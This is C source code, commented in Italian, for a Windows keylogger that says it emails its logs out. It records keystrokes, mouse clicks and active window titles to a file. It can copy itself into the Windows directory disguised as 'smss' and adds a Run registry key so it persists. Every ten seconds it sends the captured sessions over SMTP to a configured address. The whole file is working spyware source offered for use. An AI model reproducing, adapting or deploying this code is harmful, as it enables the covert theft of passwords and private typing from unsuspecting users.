/*******************************************************************/
/* Keylogger minimale con invio dei log via internet tramite email */
/*                                                                 */
/* By Gianluca Ghettini 04/01/07                                   */
/*******************************************************************/        

#include<windows.h>
#include<stdio.h>
#include<winsock.h>

#define FILENAME "data" /* nome del file di log */
#define KEYVALUE "wincmd32" /* nome della chiave nel registro */
#define SECONDS 10 /* intervallo di tempo tra un tentativo di connessione ad un altro */
#define TESTSITE1 "www.google.com" /* siti di test per connessione attiva */
#define TESTSITE2 "www.microsoft.com"
#define TESTSITE3 "www.yahoo.com"
#define BUFLEN 4096 /* dimensione buffer di appoggio */
#define FROM "kl@gmail.com" /* campo "from" della mail */
#define INSUBJECT "data" /* campo "soggetto" */
#define MALWARE 0 /* modo malware attivato = 1, disattivato = 0 */

FILE *dump;
unsigned char string[256],buffer[BUFLEN],logfile[256];
SYSTEMTIME t;
WSADATA wsa;
int err,newline,start,end;
DWORD now,last,wsaver;
SOCKET sock;
struct hostent* host;
SOCKADDR_IN heinfo;
HWND wincurrent,winlast;
char key;
char *self;


unsigned char emailserver[256]=
"nomeserver";
unsigned char emailport[15]=
"emailport:25";
unsigned char emaildest[256]=
"emaildest:prova@prova.com";

/**************************************************/
/* Funzionalita' di aggancio al sistema operativo */
/**************************************************/

void hook(char* self,int mode)
{
	HKEY hkey;
	FILE *test;
		
	if(mode)
	{
		GetWindowsDirectory(string,256);
		sprintf(buffer,"%s\\%s",string,"smss");
		test = fopen(buffer,"rb");	
		if(test==NULL)
		{
			CopyFile(self,buffer,0);
			Sleep(1000);
			ShellExecute(NULL,"open",buffer,NULL,NULL,SW_NORMAL);
			exit(0); /* auto arresto */
		}
		fclose(test);
	}
	if(RegCreateKey(HKEY_LOCAL_MACHINE,"Software\\Microsoft\\Windows\\CurrentVersion\\Run",&hkey)!=ERROR_SUCCESS) return;
	err = RegSetValueEx(hkey,KEYVALUE,0,REG_SZ,self,strlen(self));
	RegCloseKey(hkey);
	return;
}

/******************************************************************/
/* controlla se e' il momento giusto per inviare i dati via email */
/* 1 per si, 0 per no                                             */
/******************************************************************/

int ItsTheTime(void) 
{
	now = GetTickCount();
	if(MALWARE) hook(self,0);
	if((now-last)>(1000*SECONDS))
	{
		last = GetTickCount(); /* reset del timer */
		wsaver = MAKEWORD(2,0);
		err = WSAStartup(wsaver,&wsa);
		if(err==0)
		{
			host = NULL;
			if(host==NULL) host = gethostbyname(TESTSITE1);
			if(host==NULL) host = gethostbyname(TESTSITE2);
			if(host==NULL) host = gethostbyname(TESTSITE3);
			WSACleanup();
			if(host==NULL) return 0;
			if(FirstSession(&start,&end,0)==1) return 1;
			else return 0;
		}	
	}
	return 0;
}

/*******************************/
/* cerca una sessione nel file */
/* 1 = esiste 0 = non esiste   */
/*******************************/

int FirstSession(int *start,int *end)
{
	int i;
	char tag[] = "<session start>";
	char readed[15];
	
	dump = fopen(logfile,"rb");
	if(dump==NULL) return 0;
	*start = 0;
	*end = 0;
	i = 0;
	while(1)
	{
		fseek(dump,i,SEEK_SET);
		if(feof(dump))
		{
			fclose(dump);
			return 0;
		}
		if(fread(readed,1,15,dump)!=15)
		{
			fclose(dump);
			return 0;
		}
		if(strncmp(readed,tag,15)==0)
		{
			i+=15;
			*start = i;
			while(1)
			{
				fseek(dump,i,SEEK_SET);
				if(feof(dump))
				{
					fclose(dump);
					return 0;
				}
				err = fread(readed,1,15,dump);
				if(err!=15)
				{
					fclose(dump);
					return 0;
				}
				if(strncmp(readed,tag,15)==0)
				{
					*end = i;
					fclose(dump);
					return 1;
				}
				i++;
			}
		}
		i++;
	}
}

/************************************************/
/* Carica la sessione. 1 = tutto ok, 0 = errore */
/************************************************/

int SessionLoad(char *where,int start,int end)
{
	int howmany;
	
	dump = fopen(logfile,"rb");
	if(dump==NULL) return 0;
	howmany = end-start;
	fseek(dump,start,SEEK_SET);
	if(fread(where,1,howmany,dump)==howmany)
	{
		fclose(dump);
		return 1;
	}
	else
	{
		fclose(dump);
		return 0;
	}
}

/****************************/
/* Elimina la sessione      */
/* 1 = tutto ok, 0 = errore */
/****************************/

int SessionDelete(int start)
{
	int i;
	
	dump = fopen(logfile,"rb+");
	if(dump==NULL) return 0;
	start-=15;
	fseek(dump,start,SEEK_SET);
	for(i=0;i<15;i++) fputc('*',dump);
	fclose(dump);
	return 1;
}

/*******************************************/
/* invia i primi "length" bytes del buffer */
/* 1 = tutto ok, 0 = errore                */
/*******************************************/ 	

int senddata(char *buffer,int length)
{
	int i;
	
	i = 0;
	while(i<length)
	{
		err = send(sock,buffer+i,length-i,0);
		if(err<=0) return 0;
		i+=err;
	}
	for(i=0;i<length;i++) printf("%c",buffer[i]); 
	return 1;
}

/*******************************************************/
/* riceve i dati dalla socket e li inserisce in buffer */
/* ritorna con i byte inviati, 0 byte = errore         */
/*******************************************************/

int receivedata(char *buffer)
{
	err = recv(sock,buffer,BUFLEN,0);
	if(err>BUFLEN) return 0;
	if(err<=0) return 0;
	*(buffer+err) = 0;	
	return err;
}

/**************************/
/* chiude la socket e WSA */
/**************************/

int closeall(void)
{
	closesocket(sock);
	WSACleanup();
}

/****************************/
/* Invia i dati via email   */
/* 1 = tutto ok, 0 = errore */
/****************************/

int smtp(void)
{
	char *datain,*dataout;
	int length,i;
		
	wsaver = MAKEWORD(2,0);
	err = WSAStartup(wsaver,&wsa);
	if(err!=0) return 0;
	host = gethostbyname(emailserver+12);
	if(!host)
	{
		WSACleanup();
		return 0;
	}
	sock=socket(PF_INET,SOCK_STREAM,0);
	if(sock==INVALID_SOCKET)
	{
		WSACleanup();
		return 0;
	}
	heinfo.sin_family = AF_INET;
	heinfo.sin_addr=*((LPIN_ADDR)*host->h_addr_list);
	heinfo.sin_port = htons(atoi(emailport+10));
	err = connect(sock,(LPSOCKADDR)&heinfo,sizeof(struct sockaddr));
	if (err==SOCKET_ERROR)
	{
		WSACleanup();
		return 0;
	}
	receivedata(buffer);	
	sprintf(buffer,"HELO kl\n");	
	senddata(buffer,strlen(buffer));
	receivedata(buffer);
	sprintf(buffer,"MAIL FROM:<%s>\n",FROM);	
	senddata(buffer,strlen(buffer));
	receivedata(buffer);
	sprintf(buffer,"RCPT TO:<%s>\n",emaildest+10);
	senddata(buffer,strlen(buffer));
	receivedata(buffer);	
	sprintf(buffer,"DATA\n");
	senddata(buffer,strlen(buffer));
	receivedata(buffer);
	sprintf(buffer,"From:%s\n",FROM);
	senddata(buffer,strlen(buffer));
	sprintf(buffer,"To:%s\n",emaildest+10);
	senddata(buffer,strlen(buffer));
	sprintf(buffer,"Subject:%s\n",INSUBJECT);
	senddata(buffer,strlen(buffer));
	FirstSession(&start,&end);
	datain = (unsigned char *)malloc(end-start);
	if(SessionLoad(datain,start,end)!=1) return 0;
	senddata(datain,end-start);
	sprintf(buffer,"\r\n.\r\n");
	senddata(buffer,strlen(buffer));
	receivedata(buffer);		
	sprintf(buffer,"QUIT\n");
	senddata(buffer,strlen(buffer));
	receivedata(buffer);
	closesocket(sock);
	WSACleanup();
	free(datain);
	SessionDelete(start);
	return 1;
}

/*************************************************************/
/* converte un key_number nella stringa di testo appropriata */
/*************************************************************/

void table(unsigned char key_number)
{
	if((key_number>=0x30)&&(key_number<=0x39)) /* numeri */ 
	{
		if(newline) sprintf(string,"\r\n%c",key_number);
		else sprintf(string,"%c",key_number);
		newline = 0;
		return;
	}
	if((key_number>=0x41)&&(key_number<=0x5A)) /* caratteri maiuscoli/minuscoli */
	{
		if((GetKeyState(VK_CAPITAL)>0) || (GetKeyState(VK_SHIFT)&8000))
		{
			if(newline) sprintf(string,"\r\n%c",key_number);
			else sprintf(string,"%c",key_number);
		}
		else
		{
			if(newline) sprintf(string,"\r\n%c",key_number+0x20);
			else sprintf(string,"%c",key_number+0x20);
		}
		newline = 0;
		return;
	}
	newline = 1;
	switch(key_number) /* pulsanti del mouse */
	{
		case VK_LBUTTON: sprintf(string,"\r\n<MOUSE LEFT>");return;
		case VK_MBUTTON: sprintf(string,"\r\n<MOUSE MIDDLE>");return;
		case VK_RBUTTON: sprintf(string,"\r\n<MOUSE RIGHT>");return;
	}
	switch(key_number) /* tasti speciali */
	{
		case VK_ESCAPE: sprintf(string,"\r\n<ESC>");return;
		case VK_NEXT: sprintf(string,"\r\n<PAGDOWN>");return;
		case VK_END: sprintf(string,"\r\n<END>");return;
		case VK_PRIOR: sprintf(string,"\r\n<PAGUP>");return;
		case VK_HOME: sprintf(string,"\r\n<HOME>");return;
		case VK_LEFT: sprintf(string,"\r\n<LEFT>");return;
		case VK_UP: sprintf(string,"\r\n<UP>");return;
		case VK_RIGHT: sprintf(string,"\r\n<RIGHT>");return;
		case VK_DOWN: sprintf(string,"\r\n<DOWN>");return;
		case VK_INSERT: sprintf(string,"\r\n<INS>");return;
		case VK_DELETE: sprintf(string,"\r\n<DEL>");return;
	}
	if(key_number==VK_SPACE)
	{
		sprintf(string," ");
		newline = 0;
		return;
	}
	sprintf(string,"<?>");
	return;
}

/*****************************************************************/
/* Ricerca la finestra attiva sulla quale l'utente sta lavorando */
/*****************************************************************/

void SearchActiveWindow(void)
{
	wincurrent = GetForegroundWindow();
	if(wincurrent!=winlast)
	{
		winlast = wincurrent;
		err = GetWindowText(wincurrent,string,256); /* primo metodo */
		if(err!=0) /* ok */
		{
			if(strlen(string)==0) sprintf(buffer,"\r\n[>>> ??? <<<]");
			else sprintf(buffer,"\r\n[>>> %.256s <<<]",string);
		}
		else /* non ha funzionato... secondo metodo */
		{
			SendMessage(wincurrent,WM_GETTEXT,(WPARAM)256,(LPARAM)string);
			if(strlen(string)==0) sprintf(buffer,"\r\n[>>> ??? <<<]");
			else sprintf(buffer,"\r\n[>>> %.256s <<<]",string);	
		}
		dump = fopen(logfile,"ab+"); 
		fprintf(dump,buffer);
		fclose(dump);
		newline = 1;
	}
}

/*************************************/
/* motore principale a loop infinito */
/* gestisce tutti gli eventi         */
/*************************************/

void logger(void)
{
	int i,l;
	long int init[6];
	
	GetSystemTime(&t);
	init[0] = t.wDay;
	init[1] = t.wMonth;
	init[2] = t.wYear;
	init[3] = t.wHour;
	init[4] = t.wMinute;
	init[5] = t.wSecond;	
	/* scrive l'header della sessione sul log */
	dump = fopen(logfile,"ab+"); 	
	sprintf(string,"<session start>");
	fprintf(dump,string);
	sprintf(string,"\r\n<Log %02d/%02d/%02d - %02d:%02d:%02d>",t.wDay,t.wMonth,t.wYear,t.wHour,t.wMinute,t.wSecond);
	fprintf(dump,string);
	fclose(dump);
	
	/* ciclo principale */
	while(1)
	{	
		for(i=0;i<256;i++)
		{
			key = GetAsyncKeyState(i);
			if(key>0)
			{
				table(i);
				dump = fopen(logfile,"ab+"); 
				fprintf(dump,string);
				fclose(dump);
				break;
			}
		}
		SearchActiveWindow();
		Sleep(10); /* previene la saturazione della CPU */
		if(ItsTheTime()) smtp(); /* se e' il momento si inviano le informazioni via email */ 
	}	
}

int main(int argn, char* argv[])
{
	self = argv[0];
	if(MALWARE)
	{
		hook(self,1);
		GetWindowsDirectory(string,256);
		sprintf(logfile,"%s\\%s",string,FILENAME);
	}
	else
	{
		sprintf(logfile,"%s",FILENAME);
	}	
	last = GetTickCount();
	logger();
	return 0;
}